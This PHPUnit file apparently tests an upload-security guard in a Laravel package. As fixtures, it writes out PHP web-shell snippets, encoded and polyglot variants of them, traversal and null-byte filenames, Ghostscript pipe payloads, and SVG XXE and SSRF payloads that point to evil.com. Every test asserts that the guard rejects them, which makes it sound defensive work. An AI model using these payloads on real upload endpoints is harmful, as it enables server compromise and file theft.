<?php

namespace VendorShield\Shield\Tests\Unit\Guards;

use Illuminate\Http\UploadedFile;
use VendorShield\Shield\Guards\Upload\ContentScannerV2;
use VendorShield\Shield\Guards\Upload\FilenameCanonicalizer;
use VendorShield\Shield\Guards\Upload\RecursiveDecoder;
use VendorShield\Shield\Guards\Upload\SafeStoragePolicy;
use VendorShield\Shield\Guards\UploadGuard;
use VendorShield\Shield\Support\Severity;
use VendorShield\Shield\Tests\TestCase;

class UploadGuardTest extends TestCase
{
    protected UploadGuard $guard;

    protected function setUp(): void
    {
        parent::setUp();
        $this->app['config']->set('shield.guards.upload.mode', 'enforce');
        $this->app['config']->set('shield.guards.upload.allowed_mimes', []);
        $this->guard = $this->app->make(UploadGuard::class);
    }

    /*
    |--------------------------------------------------------------------------
    | BASIC FUNCTIONALITY (existing behavior preserved)
    |--------------------------------------------------------------------------
    */

    public function test_guard_name(): void
    {
        $this->assertEquals('upload', $this->guard->name());
    }

    public function test_valid_image_passes(): void
    {
        $file = UploadedFile::fake()->image('photo.jpg', 100, 100);
        $result = $this->guard->handle($file);

        $this->assertTrue($result->passed);
    }

    public function test_blocked_extension_is_rejected(): void
    {
        $file = UploadedFile::fake()->create('malware.php', 100, 'text/plain');
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('extension', $result->message);
    }

    public function test_double_extension_is_rejected(): void
    {
        $file = UploadedFile::fake()->create('malware.php.jpg', 100, 'image/jpeg');
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('Double extension', $result->message);
        $this->assertEquals(Severity::Critical, $result->severity);
    }

    public function test_null_byte_in_filename_is_rejected(): void
    {
        $file = UploadedFile::fake()->create('malware%00.jpg', 100, 'image/jpeg');
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('null byte', $result->message);
        $this->assertEquals(Severity::Critical, $result->severity);
    }

    public function test_path_traversal_in_filename_is_rejected(): void
    {
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, '1234');

        $file = new class($tmp, 'passwd.jpg', 'image/jpeg', null, true) extends UploadedFile
        {
            public function getClientOriginalName(): string
            {
                return '../../../../etc/passwd.jpg';
            }
        };

        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('path traversal', $result->message);
        unlink($tmp);
    }

    public function test_xss_in_filename_is_rejected(): void
    {
        $file = UploadedFile::fake()->create('><img src="x" onerror="alert()">.jpg', 100, 'image/jpeg');
        $result = $this->guard->handle($file);
        $this->assertStringContainsString('illegal characters', $result->message);
    }

    public function test_configuration_files_are_rejected(): void
    {
        $file = UploadedFile::fake()->create('.htaccess', 100, 'text/plain');
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('.htaccess', $result->message);
    }

    public function test_dependency_manager_files_are_rejected(): void
    {
        $file = UploadedFile::fake()->create('composer.json', 100, 'application/json');
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('composer.json', $result->message);
    }

    public function test_windows_trailing_dot_is_rejected(): void
    {
        $file = UploadedFile::fake()->create('malicious.php.', 100, 'text/plain');
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('trailing characters', $result->message);
    }

    public function test_windows_trailing_space_is_rejected(): void
    {
        $file = UploadedFile::fake()->create('malicious.php ', 100, 'text/plain');
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('trailing characters', $result->message);
    }

    public function test_windows_ads_stream_is_rejected(): void
    {
        $file = UploadedFile::fake()->create('file.asp::$DATA', 100, 'text/plain');
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('Alternate Data Stream', $result->message);
        $this->assertEquals(Severity::Critical, $result->severity);
    }

    public function test_oversized_file_is_rejected(): void
    {
        $this->app['config']->set('shield.guards.upload.max_file_size', 1024);
        $guard = $this->app->make(UploadGuard::class);

        $file = UploadedFile::fake()->create('large.pdf', 2048, 'application/pdf');
        $result = $guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('size', $result->message);
    }

    public function test_non_upload_context_passes(): void
    {
        $result = $this->guard->handle('not a file');
        $this->assertTrue($result->passed);
    }

    public function test_guard_respects_disabled_config(): void
    {
        $this->app['config']->set('shield.guards.upload.enabled', false);
        $guard = $this->app->make(UploadGuard::class);

        $this->assertFalse($guard->enabled());
    }

    public function test_url_encoded_newline_in_filename_is_rejected(): void
    {
        $file = UploadedFile::fake()->create('malicious%0a.jpg', 100, 'image/jpeg');
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('encoded newline', $result->message);
        $this->assertEquals(Severity::High, $result->severity);
    }

    /*
    |--------------------------------------------------------------------------
    | ENCODING BYPASS ATTACK SIMULATION
    |--------------------------------------------------------------------------
    */

    public function test_double_url_encoded_php_is_rejected(): void
    {
        // %253C%253Fphp → decoded once = %3C%3Fphp → decoded twice = <?php
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, '%253C%253Fphp system("whoami"); %253F%253E');

        $file = new UploadedFile($tmp, 'data.txt', 'text/plain', null, true);
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('Dangerous content', $result->message);
        unlink($tmp);
    }

    public function test_base64_encoded_php_in_content_is_rejected(): void
    {
        // Pre-computed base64 of: <?php system("id");?>
        $payload = 'PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg==';
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, "safe content here " . $payload);

        $file = new UploadedFile($tmp, 'readme.txt', 'text/plain', null, true);
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('Dangerous content', $result->message);
        unlink($tmp);
    }

    public function test_hex_encoded_php_is_rejected(): void
    {
        // \x3C\x3Fphp = <?php
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, 'normal text \x3C\x3Fphp eval(\$_POST["x"]); \x3F\x3E');

        $file = new UploadedFile($tmp, 'notes.txt', 'text/plain', null, true);
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('Dangerous content', $result->message);
        unlink($tmp);
    }

    public function test_utf7_encoded_php_is_rejected(): void
    {
        // +ADw-?php+AD4- is UTF-7 encoding of <?php>
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, '+ADw-?php system("id"); ?+AD4-');

        $file = new UploadedFile($tmp, 'document.txt', 'text/plain', null, true);
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('Dangerous content', $result->message);
        unlink($tmp);
    }

    public function test_html_entity_encoded_php_is_rejected(): void
    {
        // &#60;?php = <?php via HTML entities
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, '&#60;?php eval(base64_decode("test")); ?&#62;');

        $file = new UploadedFile($tmp, 'page.txt', 'text/plain', null, true);
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('Dangerous content', $result->message);
        unlink($tmp);
    }

    /*
    |--------------------------------------------------------------------------
    | DANGEROUS FUNCTION DETECTION
    |--------------------------------------------------------------------------
    */

    public function test_eval_pattern_is_rejected(): void
    {
        $this->app['config']->set('shield.guards.upload.reject_unknown_mime', false);
        $guard = $this->app->make(UploadGuard::class);

        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, '<?php eval(base64_decode("dGVzdA==")); ?>');

        $file = new UploadedFile($tmp, 'script.txt', 'text/plain', null, true);
        $result = $guard->handle($file);

        $this->assertFalse($result->passed);
        unlink($tmp);
    }

    public function test_system_call_is_rejected(): void
    {
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, '<?php system("whoami"); ?>');

        $file = new UploadedFile($tmp, 'test.txt', 'text/plain', null, true);
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        unlink($tmp);
    }

    public function test_shell_exec_is_rejected(): void
    {
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, '<?php shell_exec("ls -la"); ?>');

        $file = new UploadedFile($tmp, 'test.txt', 'text/plain', null, true);
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        unlink($tmp);
    }

    public function test_assert_is_rejected(): void
    {
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, '<?php assert($_GET["x"]); ?>');

        $file = new UploadedFile($tmp, 'test.txt', 'text/plain', null, true);
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        unlink($tmp);
    }

    public function test_passthru_is_rejected(): void
    {
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, '<?php passthru("cat /etc/passwd"); ?>');

        $file = new UploadedFile($tmp, 'test.txt', 'text/plain', null, true);
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        unlink($tmp);
    }

    public function test_proc_open_is_rejected(): void
    {
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, '<?php proc_open("cmd", [], $p); ?>');

        $file = new UploadedFile($tmp, 'test.txt', 'text/plain', null, true);
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        unlink($tmp);
    }

    public function test_base64_decode_obfuscation_is_rejected(): void
    {
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, '<?php eval(base64_decode("c3lzdGVtKCJpZCIpOw==")); ?>');

        $file = new UploadedFile($tmp, 'test.txt', 'text/plain', null, true);
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        unlink($tmp);
    }

    /*
    |--------------------------------------------------------------------------
    | CONTENT SCANNING AT VARIOUS OFFSETS
    |--------------------------------------------------------------------------
    */

    public function test_payload_after_8kb_is_rejected(): void
    {
        // Place PHP payload after the traditional 8KB scan boundary
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        $padding = str_repeat('A', 8194);
        file_put_contents($tmp, $padding.'<?php system("id"); ?>');

        $file = new UploadedFile($tmp, 'large.txt', 'text/plain', null, true);
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('Dangerous content', $result->message);
        unlink($tmp);
    }

    public function test_bulletproof_image_with_php_is_rejected(): void
    {
        // Fake JPEG with PHP tag in content
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, "\xFF\xD8\xFF"."<html><body><?php system(\$_GET['cmd']); ?></body></html>");

        $file = new UploadedFile($tmp, 'image.jpg', 'image/jpeg', null, true);
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        unlink($tmp);
    }

    public function test_shorthand_php_tag_is_rejected(): void
    {
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, 'hello <?=`ls`;?>');

        $file = new UploadedFile($tmp, 'script.txt', 'text/plain', null, true);
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('Dangerous content', $result->message);
        unlink($tmp);
    }

    /*
    |--------------------------------------------------------------------------
    | POLYGLOT FILE DETECTION
    |--------------------------------------------------------------------------
    */

    public function test_polyglot_jpeg_php_in_exif_is_rejected(): void
    {
        // Create a file that starts with JPEG magic bytes but has PHP payload
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        $jpeg_header = "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01";
        $php_payload = '<?php system($_GET["cmd"]); ?>';
        file_put_contents($tmp, $jpeg_header.str_repeat("\x00", 100).$php_payload);

        $file = new UploadedFile($tmp, 'photo.jpg', 'image/jpeg', null, true);
        $result = $this->guard->handle($file);

        // Should be caught by either polyglot detector or content scanner
        $this->assertFalse($result->passed);
        unlink($tmp);
    }

    public function test_polyglot_gif_php_is_rejected(): void
    {
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, 'GIF89a'.'<?php eval($_POST["x"]); ?>');

        $file = new UploadedFile($tmp, 'image.gif', 'image/gif', null, true);
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        unlink($tmp);
    }

    /*
    |--------------------------------------------------------------------------
    | FILENAME & EXTENSION ATTACK SIMULATION
    |--------------------------------------------------------------------------
    */

    public function test_extensionless_file_is_rejected(): void
    {
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, 'clean content');

        $file = new class($tmp, 'shell', 'application/octet-stream', null, true) extends UploadedFile
        {
            public function getClientOriginalName(): string
            {
                return 'shell';
            }

            public function getClientOriginalExtension(): string
            {
                return '';
            }
        };

        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('Extensionless', $result->message);
        unlink($tmp);
    }

    public function test_unicode_homoglyph_extension_is_rejected(): void
    {
        // Use Cyrillic 'р' (U+0440) which looks like Latin 'p'
        // and Greek 'ρ' (U+03C1) which also looks like 'p'
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, 'clean content');

        // \xCF\x81 = ρ (Greek rho), \xD1\x85 = х (Cyrillic ha)
        $fakeName = "shell.\xCF\x81h\xCF\x81"; // "shell.ρhρ" looks like "shell.php"

        $file = new class($tmp, $fakeName, 'application/octet-stream', null, true) extends UploadedFile
        {
            private string $fakeName;

            public function __construct(string $path, string $fakeName, ?string $mime, ?int $error, bool $test)
            {
                $this->fakeName = $fakeName;
                parent::__construct($path, $fakeName, $mime, $error, $test);
            }

            public function getClientOriginalName(): string
            {
                return $this->fakeName;
            }

            public function getClientOriginalExtension(): string
            {
                $parts = explode('.', $this->fakeName);

                return end($parts);
            }
        };

        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('homoglyph', $result->message);
        unlink($tmp);
    }

    public function test_double_encoded_traversal_in_filename_is_rejected(): void
    {
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, 'clean');

        // %252e%252e%252f = double-encoded ../
        $file = new class($tmp, 'file.jpg', 'image/jpeg', null, true) extends UploadedFile
        {
            public function getClientOriginalName(): string
            {
                return '%252e%252e%252fpasswd.jpg';
            }
        };

        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('traversal', $result->message);
        unlink($tmp);
    }

    public function test_burpsuite_null_byte_filename(): void
    {
        $file = UploadedFile::fake()->create('shell.php%00.jpg', 100, 'image/jpeg');
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('null byte', $result->message);
    }

    public function test_rtlo_character_injection_is_rejected(): void
    {
        $file = UploadedFile::fake()->create('image%E2%80%AEjpg.php', 100, 'image/jpeg');
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('RTLO', $result->message);
    }

    public function test_client_mime_spoofing_is_rejected(): void
    {
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01");

        $file = new class($tmp, 'photo.jpg', 'image/jpeg', null, true) extends UploadedFile
        {
            public function getClientMimeType(): string
            {
                return 'text/x-php';
            }
        };

        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('Client-declared MIME', $result->message);
        unlink($tmp);
    }

    public function test_spaced_double_extension_is_rejected(): void
    {
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, "\x89PNG\x0D\x0A\x1A\x0A");

        $file = new UploadedFile($tmp, 'avatar.php .png', 'image/png', null, true);
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        unlink($tmp);
    }

    public function test_archive_uploads_are_blocked_by_default(): void
    {
        if (! class_exists(\ZipArchive::class)) {
            $this->markTestSkipped('ZipArchive is not available.');
        }

        $tmp = tempnam(sys_get_temp_dir(), 'test');
        $zip = new \ZipArchive;
        $zip->open($tmp, \ZipArchive::CREATE | \ZipArchive::OVERWRITE);
        $zip->addFromString('readme.txt', 'safe');
        $zip->close();

        $file = new UploadedFile($tmp, 'bundle.zip', 'application/zip', null, true);
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('Archive uploads are blocked', $result->message);
        unlink($tmp);
    }

    public function test_zip_slip_archive_is_rejected_when_archives_are_allowed(): void
    {
        if (! class_exists(\ZipArchive::class)) {
            $this->markTestSkipped('ZipArchive is not available.');
        }

        $this->app['config']->set('shield.guards.upload.block_archives', false);
        $guard = $this->app->make(UploadGuard::class);

        $tmp = tempnam(sys_get_temp_dir(), 'test');
        $zip = new \ZipArchive;
        $zip->open($tmp, \ZipArchive::CREATE | \ZipArchive::OVERWRITE);
        $zip->addFromString('../escape.txt', 'owned');
        $zip->close();

        $file = new UploadedFile($tmp, 'bundle.zip', 'application/zip', null, true);
        $result = $guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('path traversal', strtolower($result->message));
        unlink($tmp);
    }

    /*
    |--------------------------------------------------------------------------
    | IMAGE EXPLOITATION VECTORS
    |--------------------------------------------------------------------------
    */

    public function test_imagemagick_exploit_is_rejected(): void
    {
        $this->app['config']->set('shield.guards.upload.reject_unknown_mime', false);
        $guard = $this->app->make(UploadGuard::class);

        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, "push graphic-context\nviewbox 0 0 640 480");

        $file = new UploadedFile($tmp, 'image.jpg', 'image/jpeg', null, true);
        $result = $guard->handle($file);

        $this->assertFalse($result->passed);
        unlink($tmp);
    }

    public function test_ghostscript_postscript_payload_is_rejected(): void
    {
        $this->app['config']->set('shield.guards.upload.reject_unknown_mime', false);
        $this->app['config']->set('shield.guards.upload.allowed_extensions', array_merge(
            config('shield.guards.upload.allowed_extensions', []),
            ['eps']
        ));
        $guard = $this->app->make(UploadGuard::class);

        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, "%!PS\nuserdict /setpagedevice undef\nsave\nlegal");

        $file = new UploadedFile($tmp, 'exploit.eps', 'application/postscript', null, true);
        $result = $guard->handle($file);

        $this->assertFalse($result->passed);
        unlink($tmp);
    }

    public function test_ghostscript_pipe_payload_is_rejected(): void
    {
        $this->app['config']->set('shield.guards.upload.reject_unknown_mime', false);
        $this->app['config']->set('shield.guards.upload.allowed_extensions', array_merge(
            config('shield.guards.upload.allowed_extensions', []),
            ['ps']
        ));
        $guard = $this->app->make(UploadGuard::class);

        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, 'mark /OutputFile (%pipe%id) currentdevice putdeviceprops');

        $file = new UploadedFile($tmp, 'exploit.ps', 'application/postscript', null, true);
        $result = $guard->handle($file);

        $this->assertFalse($result->passed);
        unlink($tmp);
    }

    public function test_eicar_test_signature_is_rejected(): void
    {
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*');

        $file = new UploadedFile($tmp, 'eicar_test.txt', 'text/plain', null, true);
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        $this->assertStringContainsString('Dangerous content', $result->message);
        unlink($tmp);
    }

    /*
    |--------------------------------------------------------------------------
    | SVG ATTACK VECTORS
    |--------------------------------------------------------------------------
    */

    public function test_svg_xxe_entity_is_rejected(): void
    {
        $this->app['config']->set('shield.guards.upload.allowed_extensions', array_merge(
            config('shield.guards.upload.allowed_extensions', []),
            ['svg']
        ));
        $this->app['config']->set('shield.guards.upload.allowed_mimes', array_merge(
            config('shield.guards.upload.allowed_mimes', []),
            ['image/svg+xml']
        ));
        $guard = $this->app->make(UploadGuard::class);

        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>');

        $file = new UploadedFile($tmp, 'payload.svg', 'image/svg+xml', null, true);
        $result = $guard->handle($file);

        $this->assertFalse($result->passed);
        unlink($tmp);
    }

    public function test_svg_xxe_doctype_system_is_rejected(): void
    {
        $this->app['config']->set('shield.guards.upload.allowed_extensions', array_merge(
            config('shield.guards.upload.allowed_extensions', []),
            ['svg']
        ));
        $this->app['config']->set('shield.guards.upload.allowed_mimes', array_merge(
            config('shield.guards.upload.allowed_mimes', []),
            ['image/svg+xml']
        ));
        $guard = $this->app->make(UploadGuard::class);

        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, '<!DOCTYPE svg SYSTEM "http://evil.com/xxe.dtd"><svg></svg>');

        $file = new UploadedFile($tmp, 'payload.svg', 'image/svg+xml', null, true);
        $result = $guard->handle($file);

        $this->assertFalse($result->passed);
        unlink($tmp);
    }

    public function test_svg_ssrf_xlink_is_rejected(): void
    {
        $this->app['config']->set('shield.guards.upload.allowed_extensions', array_merge(
            config('shield.guards.upload.allowed_extensions', []),
            ['svg']
        ));
        $this->app['config']->set('shield.guards.upload.allowed_mimes', array_merge(
            config('shield.guards.upload.allowed_mimes', []),
            ['image/svg+xml']
        ));
        $guard = $this->app->make(UploadGuard::class);

        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, '<svg xmlns="http://www.w3.org/2000/svg"><image xlink:href="http://evil.com/steal" /></svg>');

        $file = new UploadedFile($tmp, 'payload.svg', 'image/svg+xml', null, true);
        $result = $guard->handle($file);

        $this->assertFalse($result->passed);
        unlink($tmp);
    }

    /*
    |--------------------------------------------------------------------------
    | FAIL-CLOSED BEHAVIOR
    |--------------------------------------------------------------------------
    */

    public function test_unreadable_file_is_rejected_when_fail_closed(): void
    {
        $this->app['config']->set('shield.guards.upload.fail_closed_on_error', true);
        $guard = $this->app->make(UploadGuard::class);

        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, 'content');

        // Create a file object that simulates an inaccessible stream
        $file = new class($tmp, 'file.jpg', 'image/jpeg', null, true) extends UploadedFile
        {
            public function getRealPath(): string|false
            {
                return false;
            }

            public function getPathname(): string
            {
                return '/nonexistent/path/file.jpg';
            }
        };

        $result = $guard->handle($file);
        $this->assertFalse($result->passed);
        $this->assertStringContainsString('Unable to access', $result->message);
        unlink($tmp);
    }

    public function test_unreadable_file_passes_when_fail_open(): void
    {
        $this->app['config']->set('shield.guards.upload.fail_closed_on_error', false);
        $guard = $this->app->make(UploadGuard::class);

        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, 'content');

        $file = new class($tmp, 'file.jpg', 'image/jpeg', null, true) extends UploadedFile
        {
            public function getRealPath(): string|false
            {
                return false;
            }

            public function getPathname(): string
            {
                return '/nonexistent/path/file.jpg';
            }
        };

        $result = $guard->handle($file);
        $this->assertTrue($result->passed);
        unlink($tmp);
    }

    /*
    |--------------------------------------------------------------------------
    | PHP SUPERGLOBAL DETECTION
    |--------------------------------------------------------------------------
    */

    public function test_get_superglobal_access_is_rejected(): void
    {
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, '<?php echo $_GET["page"]; ?>');

        $file = new UploadedFile($tmp, 'test.txt', 'text/plain', null, true);
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        unlink($tmp);
    }

    public function test_request_superglobal_access_is_rejected(): void
    {
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, '<?php $cmd = $_REQUEST["cmd"]; system($cmd); ?>');

        $file = new UploadedFile($tmp, 'test.txt', 'text/plain', null, true);
        $result = $this->guard->handle($file);

        $this->assertFalse($result->passed);
        unlink($tmp);
    }

    /*
    |--------------------------------------------------------------------------
    | DEDICATED ENGINE UNIT TESTS
    |--------------------------------------------------------------------------
    */

    public function test_recursive_decoder_double_url_decoding(): void
    {
        $decoder = new RecursiveDecoder(5);

        // Double URL encoded <?php
        $encoded = '%253C%253Fphp';
        $decoded = $decoder->decode($encoded);

        $this->assertStringContainsString('<?php', $decoded);
    }

    public function test_recursive_decoder_hex_decoding(): void
    {
        $decoder = new RecursiveDecoder(5);

        $encoded = '\x3C\x3Fphp system("id");';
        $decoded = $decoder->decode($encoded);

        $this->assertStringContainsString('<?php', $decoded);
    }

    public function test_filename_canonicalizer_homoglyph_normalization(): void
    {
        $canonicalizer = new FilenameCanonicalizer;

        // Greek rho ρ (U+03C1) should normalize to 'p'
        $result = $canonicalizer->canonicalize("shell.\xCF\x81h\xCF\x81");
        $ext = $canonicalizer->extractExtension($result);

        $this->assertEquals('php', $ext);
    }

    public function test_filename_canonicalizer_traversal_stripping(): void
    {
        $canonicalizer = new FilenameCanonicalizer;

        $result = $canonicalizer->canonicalize('../../../../etc/passwd.jpg');

        $this->assertStringNotContainsString('..', $result);
        $this->assertStringNotContainsString('/', $result);
    }

    public function test_filename_canonicalizer_extensionless_detection(): void
    {
        $canonicalizer = new FilenameCanonicalizer;

        $this->assertTrue($canonicalizer->isExtensionless('shell'));
        $this->assertFalse($canonicalizer->isExtensionless('image.jpg'));
    }

    public function test_filename_canonicalizer_random_generation(): void
    {
        $canonicalizer = new FilenameCanonicalizer;

        $name1 = $canonicalizer->generateStorageFilename('jpg');
        $name2 = $canonicalizer->generateStorageFilename('jpg');

        $this->assertNotEquals($name1, $name2);
        $this->assertStringEndsWith('.jpg', $name1);
        $this->assertEquals(36, strlen($name1)); // 32 hex + dot + 3 ext
    }

    public function test_content_scanner_v2_detects_obfuscated_function(): void
    {
        $scanner = new ContentScannerV2;

        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, '<?php $f="system"; $f("id"); ?>');

        $result = $scanner->scan($tmp);
        $this->assertFalse($result->clean);
        unlink($tmp);
    }

    public function test_safe_storage_policy_hash_sharding(): void
    {
        $policy = new SafeStoragePolicy;

        $hash = 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6';
        $path = $policy->generateShardedPath($hash);

        $this->assertEquals('a1'.DIRECTORY_SEPARATOR.'b2', $path);
    }

    /*
    |--------------------------------------------------------------------------
    | CLEAN FILE ACCEPTANCE (Positive Tests)
    |--------------------------------------------------------------------------
    */

    public function test_clean_text_file_passes(): void
    {
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, 'Hello, this is a completely normal text file with no threats.');

        $file = new UploadedFile($tmp, 'readme.txt', 'text/plain', null, true);
        $result = $this->guard->handle($file);

        $this->assertTrue($result->passed);
        unlink($tmp);
    }

    public function test_clean_pdf_file_passes(): void
    {
        $tmp = tempnam(sys_get_temp_dir(), 'test');
        file_put_contents($tmp, "%PDF-1.4\n1 0 obj\n<</Type/Catalog>>\nendobj\n");

        $file = new UploadedFile($tmp, 'document.pdf', 'application/pdf', null, true);
        $result = $this->guard->handle($file);

        $this->assertTrue($result->passed);
        unlink($tmp);
    }

    public function test_valid_jpeg_file_passes(): void
    {
        $file = UploadedFile::fake()->image('vacation.jpg', 640, 480);
        $result = $this->guard->handle($file);

        $this->assertTrue($result->passed);
    }

    public function test_valid_png_file_passes(): void
    {
        $file = UploadedFile::fake()->image('logo.png', 200, 200);
        $result = $this->guard->handle($file);

        $this->assertTrue($result->passed);
    }
}
